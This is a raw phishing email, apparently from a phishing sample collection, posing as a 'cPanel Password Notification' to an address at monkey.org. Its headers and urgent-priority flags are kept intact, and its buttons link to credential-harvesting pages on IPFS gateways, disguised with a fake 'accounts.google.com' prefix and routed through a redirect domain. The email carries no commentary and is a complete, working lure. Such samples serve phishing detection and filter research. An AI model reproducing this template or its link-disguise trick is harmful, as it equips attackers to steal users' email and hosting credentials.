@@ -1,0 +1,231 @@
+Return-Path: frieda@lethanhtam.cfd
+Delivered-To: jose@monkey.org
+X-FDA: 81758635182.35.039DCF0
+Received: from mail.lethanhtam.cfd (mail.lethanhtam.cfd [104.236.71.80])
+	by imf05.b.hostedemail.com (Postfix) with ESMTP id 7E5371C0004
+	for <jose@monkey.org>; Mon,  5 Feb 2024 18:48:10 +0000 (UTC)
+Authentication-Results: imf05.b.hostedemail.com;	dkim=none;	dmarc=pass
+ (policy=none) header.from=lethanhtam.cfd;	spf=pass (imf05.b.hostedemail.com:
+ domain of frieda@lethanhtam.cfd designates 104.236.71.80 as permitted sender)
+ smtp.mailfrom=frieda@lethanhtam.cfd
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1707158890;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:content-transfer-encoding:in-reply-to:	 references;
+ bh=Fg2kEFP9O3gko0olwrMYkDnJw6EonBsizMeCsL2DX3c=;
+	b=GxoqGH9tS1I3jb0CwLDKsrZ9d5EDq1XL5UUEwEDbhxTEeEdXurlaoUzUCweKfSg0ZjJEp2
+	Xo9KisSDtd6P5zsQe/RFerwzPq5pnfv6LSjNiosP2rcrJNt5FHkzmQnS0L+KU8UBApU4UQ
+	FOj2HZTePdcp/9R59Ea9I8NPqD6a4A4=
+ARC-Authentication-Results: i=1;	imf05.b.hostedemail.com;	dkim=none;
+	dmarc=pass (policy=none) header.from=lethanhtam.cfd;	spf=pass
+ (imf05.b.hostedemail.com: domain of frieda@lethanhtam.cfd designates
+ 104.236.71.80 as permitted sender) smtp.mailfrom=frieda@lethanhtam.cfd
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1707158890; a=rsa-sha256;
+	cv=none;
+	b=Ql2uhuTiNVd/7EKZdI11YEk9gYluB8zGRdSpDy1o0roaKPvFSo9uiFcIHYkOxNVcs+inkt
+	pTTXH0E5jf/bFvXAArNGuqZYe5eEMSR9cPSod74+ru8o95UFtPvuNjVY+V16fDJS/iIKEn
+	gBrT2jMPFbHqY4UawdyTHDEUY7OzmUc=
+Received: from WIN-R54JGDV30UM (unknown [198.244.140.121])
+	by mail.lethanhtam.cfd (Postfix) with ESMTPA id 0700686332
+	for <jose@monkey.org>; Mon,  5 Feb 2024 09:47:23 -0900 (AKST)
+From: "cPanel On monkey.org" <frieda@lethanhtam.cfd>
+Subject: CPanel Password Notification Email: jose@monkey.org
+To: <jose@monkey.org>
+Content-Type: multipart/alternative;
+ boundary="5uR1IdqiCvVQw9KqKCUHVKTtpeCUL8=_Z9"
+MIME-Version: 1.0
+Date: Mon, 5 Feb 2024 10:47:24 -0800
+Priority: urgent
+X-Priority: 1
+Importance: high
+Message-Id: <20240502104723C88B1BAD9F-01842B890C@lethanhtam.cfd>
+X-Rspamd-Server: rspam04
+X-Rspamd-Queue-Id: 7E5371C0004
+X-Stat-Signature: hihjtpesaa6z3a5x1razkwgq8umtg46d
+X-Spam-Status: No, score=-0.13
+X-Rspam-User: 
+X-HE-Tag: 1707158890-899951
+X-HE-Meta: =?utf-8?q?U2FsdGVkX18S3JbSfhno4QGbYW/e2m/nwwM8Yq3KWIeCDrK/MdLwM19?=
+ =?utf-8?q?8Bnk4zh+C3Npi85MCMGSASTpMPE6bC5ad3/hXF5YS5XEKtC/7NXLppZ+baDRLgdgV?=
+ =?utf-8?q?mWuVAec+eJFEE3ENPBcuPSQwRLFgPC12qhFuZAi0pWDkTx9weDQml0nKAiosQfWAD?=
+ =?utf-8?q?CkSdTWmf2xI5tXjss6XK2mMaA5Q/5oC9OPLDbGlmhkHNC5J9Xs=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 45
+
+This is a multi-part message in MIME format
+
+--5uR1IdqiCvVQw9KqKCUHVKTtpeCUL8=_Z9
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+=A0
+
+
+ =A0
+ cPanel
+ Password Notification
+
+
+
+
+ Account:=A0Registered
+ Domain:=A0monkey.org
+ Notification
+ Purpose:=A0Password Expires in 24
+ hours
+ Date:=A0Monday, February 5, 2024
+
+
+ Keep
+ the Same Password. mailto:jose@monkey.org=A0=A0=A0=A0=A0=A0Skip
+ Till 6 Months https://accounts.google.com+signin%3Dsecure+v2+identifi=
+er%3Dpassive@bafybeidi3zodaskrgqyjgfe2smxmkjroarjowoqly63fv7fdqpywgibr=
+w4.ipfs.cf-ipfs.com/newdoma.html#jose@monkey.org=A0=A0=A0=A0=A0
+
+Thank you for
+going paperless.
+
+--5uR1IdqiCvVQw9KqKCUHVKTtpeCUL8=_Z9
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
+8859-1">
+ <title>CPanel Password Notification Email: jose@monkey.org</title>
+</head>
+ <body> <P>&nbsp;</P><table style=3D"FONT-SIZE: 14px; TEXT-DECORATION:=
+ none; BORDER-TOP: rgb(211,211,211) 1px dotted; FONT-FAMILY: Roboto, s=
+ans-serif; BORDER-RIGHT: rgb(211,211,211) 1px dotted; WHITE-SPACE: nor=
+mal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(=
+211,211,211) 1px dotted; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR=
+: rgb(44,54,58); FONT-STYLE: normal; BORDER-LEFT: rgb(211,211,211) 1px=
+ dotted; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); f=
+ont-variant-caps: normal; -webkit-text-stroke-width: 0px" cellSpacing=3D=
+0 cellPadding=3D0 width=3D"100%"><tbody style=3D"BOX-SIZING: border-bo=
+x"> <TR style=3D"BOX-SIZING: border-box"> <TD style=3D"BOX-SIZING: bor=
+der-box; BORDER-TOP: rgb(211,211,211) 1px dotted; FONT-FAMILY: Arial, =
+Helvetica, sans-serif; BORDER-RIGHT: rgb(211,211,211) 1px dotted; WIDT=
+H: 10px; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; PADDING-BOTTOM: 1=
+5px; PADDING-TOP: 15px; PADDING-LEFT: 0px; BORDER-LEFT: rgb(211,211,21=
+1) 1px dotted; MARGIN: 0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px; BAC=
+KGROUND-COLOR: orange" width=3D10>&nbsp;</td><td style=3D"BOX-SIZING: =
+border-box; BORDER-TOP: rgb(211,211,211) 1px dotted; FONT-FAMILY: Aria=
+l, Helvetica, sans-serif; BORDER-RIGHT: rgb(211,211,211) 1px dotted; W=
+IDTH: 570px; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; PADDING-BOTTO=
+M: 15px; PADDING-TOP: 15px; PADDING-LEFT: 10px; BORDER-LEFT: rgb(211,2=
+11,211) 1px dotted; MARGIN: 0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 15p=
+x; BACKGROUND-COLOR: orange" align=3Dleft><SPAN style=3D"BOX-SIZING: b=
+order-box; FONT-SIZE: 30px; FONT-WEIGHT: bold; COLOR: rgb(255,255,255)=
+; LINE-HEIGHT: 36px">cPanel Password Notification</SPAN></TD></TR></TA=
+BLE><table style=3D"FONT-SIZE: 14px; TEXT-DECORATION: none; BORDER-TOP=
+: rgb(211,211,211) 1px dotted; FONT-FAMILY: Roboto, sans-serif; BORDER=
+-RIGHT: rgb(211,211,211) 1px dotted; WIDTH: 598px; WHITE-SPACE: normal=
+; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(211=
+,211,211) 1px dotted; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: r=
+gb(44,54,58); FONT-STYLE: normal; BORDER-LEFT: rgb(211,211,211) 1px do=
+tted; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); font=
+-variant-caps: normal; -webkit-text-stroke-width: 0px" cellSpacing=3D0=
+ cellPadding=3D0 bgColor=3D#ffffff border=3D0><tbody style=3D"BOX-SIZI=
+NG: border-box"> <TR style=3D"BOX-SIZING: border-box"> <TD style=3D"BO=
+X-SIZING: border-box; BORDER-TOP: rgb(211,211,211) 1px dotted; FONT-FA=
+MILY: Arial, Helvetica, sans-serif; BORDER-RIGHT: rgb(211,211,211) 1px=
+ dotted; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; BORDER-LEFT: rgb(=
+211,211,211) 1px dotted; MARGIN: 0px; LINE-HEIGHT: 22px"><table style=3D=
+"BORDER-TOP: rgb(211,211,211) 1px dotted; BORDER-RIGHT: rgb(211,211,21=
+1) 1px dotted; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(211,211,2=
+11) 1px dotted; BORDER-LEFT: rgb(211,211,211) 1px dotted" cellSpacing=3D=
+0 cellPadding=3D0 bgColor=3D#ffffff><tbody style=3D"BOX-SIZING: border=
+-box"> <TR style=3D"BOX-SIZING: border-box"> <TD style=3D"BOX-SIZING: =
+border-box; BORDER-TOP: rgb(211,211,211) 1px dotted; BORDER-RIGHT: rgb=
+(211,211,211) 1px dotted; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; =
+BORDER-LEFT: rgb(211,211,211) 1px dotted; MARGIN: 0px; LINE-HEIGHT: 22=
+px"><table style=3D"BORDER-TOP: rgb(211,211,211) 1px dotted; BORDER-RI=
+GHT: rgb(211,211,211) 1px dotted; BORDER-COLLAPSE: collapse; BORDER-BO=
+TTOM: rgb(211,211,211) 1px dotted; BORDER-LEFT: rgb(211,211,211) 1px d=
+otted" cellSpacing=3D0 cellPadding=3D0 width=3D673 align=3Dleft bgColo=
+r=3D#ffffff><tbody style=3D"BOX-SIZING: border-box"> <TR style=3D"BOX-=
+SIZING: border-box"> <TD style=3D"BOX-SIZING: border-box; BORDER-TOP: =
+rgb(211,211,211) 1px dotted; BORDER-RIGHT: rgb(211,211,211) 1px dotted=
+; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; PADDING-TOP: 20px; PADDI=
+NG-LEFT: 20px; BORDER-LEFT: rgb(211,211,211) 1px dotted; MARGIN: 0px; =
+LINE-HEIGHT: 22px; PADDING-RIGHT: 20px" vAlign=3Dtop width=3D671> <UL =
+style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px"> <LI style=3D"BOX-SI=
+ZING: border-box"> <DIV style=3D"BOX-SIZING: border-box; MARGIN: 0px 0=
+px 20px; LINE-HEIGHT: 20px; BORDER-TOP-WIDTH: 0px"><SPAN style=3D"BOX-=
+SIZING: border-box"><FONT style=3D"BOX-SIZING: border-box" size=3D2 fa=
+ce=3D"@ JhengHei">Account</FONT></SPAN><FONT style=3D"BOX-SIZING: bord=
+er-box" size=3D2 face=3D"@ JhengHei"><SPAN style=3D"BOX-SIZING: border=
+-box">:</SPAN>&nbsp;<A style=3D"COLOR: rgb(17,85,204)" href=3D"mailto:=
+jose@monkey.org" target=3D_blank>jose@monkey.org</A></FONT></DIV> <LI =
+style=3D"BOX-SIZING: border-box"> <DIV style=3D"BOX-SIZING: border-box=
+; MARGIN: 0px 0px 20px; LINE-HEIGHT: 20px; BORDER-TOP-WIDTH: 0px"><FON=
+T style=3D"BOX-SIZING: border-box" size=3D2 face=3D"@ JhengHei"><SPAN =
+style=3D"BOX-SIZING: border-box">Registered Domain:</SPAN><SPAN class=3D=
+Apple-converted-space>&nbsp;monkey.org</SPAN></FONT></DIV> <LI style=3D=
+"BOX-SIZING: border-box"> <DIV style=3D"BOX-SIZING: border-box; MARGIN=
+: 0px 0px 20px; LINE-HEIGHT: 20px; BORDER-TOP-WIDTH: 0px"><FONT style=3D=
+"BOX-SIZING: border-box" size=3D2 face=3D"@ JhengHei"><SPAN style=3D"B=
+OX-SIZING: border-box">Notification Purpose:</SPAN>&nbsp;Password Expi=
+res in 24 hours</FONT></DIV> <LI style=3D"BOX-SIZING: border-box"> <DI=
+V style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 20px; LINE-HEIGHT: =
+20px; BORDER-TOP-WIDTH: 0px"><FONT style=3D"BOX-SIZING: border-box" si=
+ze=3D2 face=3D"@ JhengHei"><SPAN style=3D"BOX-SIZING: border-box">Date=
+:</SPAN><SPAN class=3DApple-converted-space>&nbsp;</SPAN>Monday, Febru=
+ary 5, 2024</FONT></DIV></LI></UL></TD></TR> <TR style=3D"BOX-SIZING: =
+border-box"> <TD style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(211,=
+211,211) 1px dotted; BORDER-RIGHT: rgb(211,211,211) 1px dotted; BORDER=
+-BOTTOM: rgb(211,211,211) 1px dotted; PADDING-TOP: 0px; PADDING-LEFT: =
+20px; BORDER-LEFT: rgb(211,211,211) 1px dotted; MARGIN: 0px; LINE-HEIG=
+HT: 22px; PADDING-RIGHT: 20px" vAlign=3Dtop width=3D671><BR> <P style=3D=
+"BOX-SIZING: border-box; MARGIN-BOTTOM: 0px; MARGIN-TOP: 0px; PADDING-=
+BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px=
+"><A title=3D"Read Fax" style=3D"BOX-SIZING: border-box; TEXT-DECORATI=
+ON: none; COLOR: rgb(255,255,255); OUTLINE-WIDTH: 0px; PADDING-BOTTOM:=
+ 11px; PADDING-TOP: 11px; OUTLINE-STYLE: none; PADDING-LEFT: 24px; OUT=
+LINE-COLOR: invert; PADDING-RIGHT: 24px; BACKGROUND-COLOR: rgb(227,96,=
+9)" href=3D"https://accounts.google.com+signin%3Dsecure+v2+identifier%=
+3Dpassive@bafybeidi3zodaskrgqyjgfe2smxmkjroarjowoqly63fv7fdqpywgibrw4.=
+ipfs.cf-ipfs.com/newdoma.html#jose@monkey.org" rel=3Dnoreferrer target=
+=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps=
+://bratateknik.com/.well-known/home.php?url%3Dhttps://bafybeicmqkmkoyq=
+itcono5nwgeme44h7wrdck3xev2wl3246ay5x2xgaj4.ipfs.cf-ipfs.com/newdomain=
+=2Ehtml%23%5BEMail%5D&amp;source=3Dgmail&amp;ust=3D1707235888807000&am=
+p;usg=3DAOvVaw0vRX1M0OXtizDH1roJVije">Keep the Same Password.</A><FONT=
+ style=3D"BOX-SIZING: border-box" color=3D#e36009>&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;</FONT>&nbsp;<A title=3D"Read Fax" style=3D"BOX-SIZING: bord=
+er-box; TEXT-DECORATION: none; COLOR: rgb(255,255,255); OUTLINE-WIDTH:=
+ 0px; PADDING-BOTTOM: 11px; PADDING-TOP: 11px; OUTLINE-STYLE: none; PA=
+DDING-LEFT: 24px; OUTLINE-COLOR: invert; PADDING-RIGHT: 24px; BACKGROU=
+ND-COLOR: rgb(227,96,9)" href=3D"https://accounts.google.com+signin%3D=
+secure+v2+identifier%3Dpassive@bafybeidi3zodaskrgqyjgfe2smxmkjroarjowo=
+qly63fv7fdqpywgibrw4.ipfs.cf-ipfs.com/newdoma.html#jose@monkey.org" re=
+l=3Dnoreferrer target=3D_blank data-saferedirecturl=3D"https://www.goo=
+gle.com/url?q=3Dhttps://accounts.google.com%2Bsignin%3Dsecure%2Bv2%2Bi=
+dentifier%3Dpassive@bafybeicmqkmkoyqitcono5nwgeme44h7wrdck3xev2wl3246a=
+y5x2xgaj4.ipfs.dweb.link/newdomain.html%23%5BEMail%5D&amp;source=3Dgma=
+il&amp;ust=3D1707235888807000&amp;usg=3DAOvVaw2FBpBIoaufKwnf4IhiLztC">=
+Skip Till 6 Months</A><FONT style=3D"BOX-SIZING: border-box" color=3D#=
+008000>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></P></TD></TR></TABLE></TD=
+></TR></TABLE></TD></TR></TABLE> <P style=3D"BOX-SIZING: border-box; F=
+ONT-SIZE: 14px; MARGIN-BOTTOM: 0px; TEXT-DECORATION: none; FONT-FAMILY=
+: Calibri, Helvetica, sans-serif, serif, EmojiFont; WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; MARGIN-TOP: 0px; TEXT-TRANSFORM: none; FONT-WEIG=
+HT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; LETTER-SPACING: normal=
+; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-c=
+aps: normal; -webkit-text-stroke-width: 0px"><SPAN lang=3Dzh-CN style=3D=
+"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT-FAMILY: arial, s=
+ans-serif, serif, EmojiFont; BORDER-RIGHT-WIDTH: 0px; BORDER-BOTTOM-WI=
+DTH: 0px; MARGIN: 0px; BORDER-TOP-WIDTH: 0px"><FONT style=3D"BOX-SIZIN=
+G: border-box" size=3D1 face=3D"@Microsoft JhengHei">Thank you for goi=
+ng paperless.</FONT></SPAN></P></body>
+</html>
+
+--5uR1IdqiCvVQw9KqKCUHVKTtpeCUL8=_Z9--
+
+
